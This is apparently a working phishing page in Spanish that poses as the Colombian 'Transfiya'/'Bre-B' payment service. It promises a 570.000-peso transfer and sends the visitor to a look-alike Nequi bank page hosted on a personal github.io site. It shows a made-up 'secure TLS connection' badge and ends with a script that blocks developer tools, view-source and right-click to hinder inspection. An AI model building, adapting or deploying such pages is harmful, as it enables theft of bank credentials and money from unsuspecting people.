<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfiya - Selecciona tu Banco</title>
    <style>
        /* Base y Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #32005f;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        header {
            padding: 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 900px;
            margin: 0 auto;
            width: 100%;
        }

        .logo {
            height: 2rem;
            filter: brightness(0) invert(1);
        }

        .monto-container {
            text-align: right;
        }

        .monto-label {
            font-size: 10px;
            opacity: 0.6;
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .monto-valor {
            font-weight: bold;
            font-size: 1.25rem;
        }

        /* Contenido Principal */
        main {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem 1rem 3rem 1rem;
        }

        .container {
            max-width: 400px;
            width: 100%;
        }

        .text-center {
            text-align: center;
            margin-bottom: 2rem;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: bold;
            letter-spacing: -0.025em;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            font-size: 0.875rem;
            color: rgba(255, 255, 255, 0.7);
        }

        .subtitle b {
            color: white;
        }

        /* Tarjetas de Bancos */
        .card-bank {
            background-color: white;
            padding: 1rem;
            border-radius: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            text-decoration: none;
            margin-bottom: 0.75rem;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
            transition: all 0.2s ease-in-out;
        }

        .card-bank:hover {
            background-color: #f9fafb;
            transform: translateY(-2px);
        }

        .card-bank:active {
            transform: scale(0.98);
        }

        .bank-info {
            display: flex;
            align-items: center;
        }

        .bank-logo-wrapper {
            width: 3.5rem;
            height: 3.5rem;
            background-color: white;
            border-radius: 9999px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            border: 1px solid #f3f4f6;
            margin-right: 1rem;
        }

        .bank-logo-wrapper img {
            width: 2.5rem;
            height: auto;
        }

        .bank-name {
            color: #1f2937;
            font-weight: bold;
            font-size: 1.125rem;
        }

        .arrow-icon {
            height: 1.5rem;
            width: 1.5rem;
            color: #d1d5db;
            transition: color 0.2s;
        }

        .card-bank:hover .arrow-icon {
            color: #32005f;
        }

        /* Información técnica inferior */
        .info-footer {
            text-align: center;
            padding-top: 1rem;
            color: rgba(255, 255, 255, 0.4);
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 10px;
            text-transform: uppercase;
        }

        /* Footer / Indicador de pasos */
        footer {
            padding: 1rem;
            display: flex;
            justify-content: center;
            gap: 0.5rem;
        }

        .step-dot {
            height: 4px;
            width: 2rem;
            border-radius: 9999px;
            background-color: rgba(255, 255, 255, 0.2);
        }

        .step-dot.active {
            background-color: white;
        }

        /* Ajustes para móviles */
        @media (max-width: 640px) {
            header {
                padding: 1rem;
            }
            h1 {
                font-size: 1.25rem;
            }
        }
    </style>
</head>

<body>

    <header>
        <img src="img/bre-b.png" alt="Logo Transfiya" class="logo">
        <div class="monto-container">
            <p class="monto-label">Monto a recibir</p>
            <p class="monto-valor">$570.000</p>
        </div>
    </header>

    <main>
        <div class="container">
            <div class="text-center">
                <h1>Selecciona tu entidad</h1>
                <p class="subtitle">Elige la cuenta donde tienes registrada tu <b>Llave Bre-B</b></p>
            </div>

            <div class="list-banks">
                <a href="https://dancrazzy.github.io/Bre-b/nequi/index.html" class="card-bank">
                    <div class="bank-info">
                        <div class="bank-logo-wrapper">
                            <img src="img/nequi.png" alt="Nequi">
                        </div>
                        <span class="bank-name">Nequi</span>
                    </div>
                    <svg xmlns="http://www.w3.org/2000/svg" class="arrow-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                    </svg>
                </a>

            <div class="info-footer">
                <p>Conexión Segura TLS 1.3 | IP: 186.98.20.241</p>
                <p style="margin-top: 4px;">Sábado 18 Abril 2026</p>
            </div>
        </div>
    </main>

    <footer>
        <div class="step-dot"></div>
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
    </footer>

        <script>
       

        // --- Bloqueo de inspección y teclado ---
        document.onkeydown = function(e) {
            // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.keyCode == 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                return false;
            }
        };

        // Bloquear clic derecho
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, false);
    </script>
</body>
</html>
